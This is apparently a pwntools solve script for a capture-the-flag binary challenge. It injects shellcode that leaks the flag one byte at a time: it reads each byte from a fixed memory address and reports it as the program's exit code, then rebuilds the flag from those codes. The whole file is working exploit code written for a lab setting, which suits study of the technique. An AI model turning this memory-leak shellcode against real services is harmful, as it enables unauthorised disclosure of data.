#!/usr/bin/env python3

from pwn import *

exe = ELF("./app-bytes_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    leak = b""
    filterd_leak = b""
    for i in range(0x00, 0x30):
        r = conn()
        shellcode = f"""
            mov rax, 60
            mov rdi, [{0x4d1180 + i}]
            syscall
            """
        r.sendline(b"1")
        r.sendline(asm(shellcode))
        r.recvuntil("Shellcode exited with code: ")
        leak += r.recvline()
        r.clean()
        r.close()
    filtered_leak = leak.replace(b"\n", b" ").split()
    flag = ""
    for i in filtered_leak:
        flag += chr(int(i))
    print(flag)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
